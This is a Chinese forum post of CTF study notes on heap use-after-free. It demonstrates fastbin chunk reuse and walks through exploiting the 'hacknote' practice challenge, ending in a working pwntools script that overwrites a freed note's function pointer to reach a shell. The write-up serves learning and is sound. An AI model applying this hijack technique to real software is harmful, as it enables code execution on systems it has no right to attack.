
# [原创]PWN学习笔记【堆】【UAF】从实验到原理

开局一段代码：

```
#include <stdio.h>

void func1()
{
    printf("func1\n");
}

void hack()
{
    printf("hack\n");
}

struct Pfunc
{
    void (*p)();
};

int main()
{
    struct Pfunc* lpfunc = malloc(8);
    lpfunc->p = func1;
    lpfunc->p();

    free(lpfunc);

    long* hack_point = malloc(8);
    *hack_point = hack;

    lpfunc->p();
    return 0;
}
```

编译32位：`gcc -g -m32 test.c`

猜一猜程序会怎么执行？

···

当当当当：

![](https://bbs.kanxue.com/upload/attach/202206/861996_VWEV687ZVXDYMN6.jpg)

## 为啥会这样呢

`glibc` 的 `ptmalloc` 在管理释放的内存叫 `bin`，申请的堆块叫 `chunk`

其中小 `chunk` 内存管理器叫 `fastbins`，使用的是 `LIFO` 的规则，后进先出。所以申请同样大小的小 `chunk`，会使用最后一次 `free` 的 `chunk`

执行完 `free` 过后，`fastbins` 中存放了刚刚 `free` 的指针 `0x804b000`

![](https://bbs.kanxue.com/upload/attach/202206/861996_TWV6N2W5C33V669.jpg)

执行 `malloc(8)` 后，看到 `fastbins` 中的 `chunk` 指针没有了

![](https://bbs.kanxue.com/upload/attach/202206/861996_HT6MRFD85U9GRYA.jpg)

看下 `hack_point` 的地址，确实是刚刚 `free` 的地址，此时两个指针指向同一块内存

![](https://bbs.kanxue.com/upload/attach/202206/861996_CQS5PFFX7PVY6Y8.jpg)

为啥这两个指针=`0x0804b008`，而 `fastbins` 存的 `0x0804b000`

在32位下 `chunk` 的结构：

```
struct chunk
{
    size_t 暂时不管;
    size_t size;//低3位不算长度
    char user_data[0];
}
```

刚好偏移是8

## ok，搞清楚原理了，来一道题：`hacknote`

程序提供了记事本功能

![](https://bbs.kanxue.com/upload/attach/202206/861996_3Q95565FP28748H.jpg)

其中 `add_note` 函数在 `notelist` 中找一个空位置用来写日记，但是删除日记 `del_note` 函数中却没有把指针置空。`print_note` 函数可以使用已经 `free` 的指针，存在 `UAF` 漏洞。

![](https://bbs.kanxue.com/upload/attach/202206/861996_3GFDRKUQ8U22HXB.jpg)

![](https://bbs.kanxue.com/upload/attach/202206/861996_GFWRHSVZDUDMJZZ.jpg)

![](https://bbs.kanxue.com/upload/attach/202206/861996_P5HANQ488YKP25X.jpg)

现在的目标就是，把 `notelist[x]->pFunc = magic`，然后使用已经 `free` 的 `notelist[x]`

![](https://bbs.kanxue.com/upload/attach/202206/861996_UYBG2RXSGDHZZGM.jpg)

## 具体操作如下

1. 因为 `noteNode` 的大小为8，如果想准确控制第二个 `noteNode` 的 `pFunc`，那么 `noteNode->note` 的大小不能是8。创建两个24字节的 `note` 后内存长这样：

   ![](https://bbs.kanxue.com/upload/attach/202206/861996_UQPA42CTQ4UESMV.jpg)

   对照：

   ![](https://bbs.kanxue.com/upload/attach/202206/861996_3XZKSTR8JHX9BXG.jpg)

2. 依次 `free` `note[0]`、`note[1]`，试 `fastbins` 变成这样：

   ![](https://bbs.kanxue.com/upload/attach/202206/861996_3NC6GE9YW7UJDHZ.jpg)

   `0x804b030` 是 `note[1]` 的 `chunk`，`0x804b000` 是 `note[0]` 的 `chunk`

   也就是之后 `malloc(8)` 的时候，第一次会得到 `0x804b030`，第二次会得到 `0x804b000`

3. 创建 `note[2]`，使 `note` 的大小=8，此时 `note` 的地址是 `0x804b008`，仔细看看这个地址，就是 `note[0]` 的 `pFunc`。把 `magic` 的地址写入，

   这时候 `note[0]->pFunc` 的值就是 `magic` 了

   ![](https://bbs.kanxue.com/upload/attach/202206/861996_GSW9M3DDVXRYSQG.jpg)

   ![](https://bbs.kanxue.com/upload/attach/202206/861996_ADUM63ANUVP75YK.jpg)

4. 执行 `print_note(0)`，执行0号 `note` 的 `pFunc` 函数，`getshell`

   ![](https://bbs.kanxue.com/upload/attach/202206/861996_NQKJMP3S5VJB6N3.jpg)

## exp

```
from pwn import *

context.log_level = 'debug'

sh = process("./hacknote")
# sh = gdb.debug("./hacknote", "b *add_note\nc")
elf = ELF("./hacknote")

def add_note(size, note=b"123"):
    sh.sendlineafter(b"Your choice :", b"1")
    sh.sendlineafter(b"Note size :", str(size).encode())
    sh.sendlineafter(b"Content :", note)

def del_note(index):
    sh.sendlineafter(b"Your choice :", b"2")
    sh.sendlineafter(b"Index :", str(index).encode())

def print_note(index):
    sh.sendlineafter(b"Your choice :", b"3")
    sh.sendlineafter(b"Index :", str(index).encode())

add_note(24)
add_note(24)

del_note(0)
del_note(1)

add_note(8, p32(elf.sym["magic"]))
print_note(0)

sh.interactive()
pause()
```

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2022-6-15 17:29 被洋洋不得意编辑，原因：修改描述错误

上传的附件：

- [`hacknote`](javascript:void(0);)
  （7.66kb，15次下载）
- [`hacknote.idb`](javascript:void(0);)
  （160.85kb，13次下载）
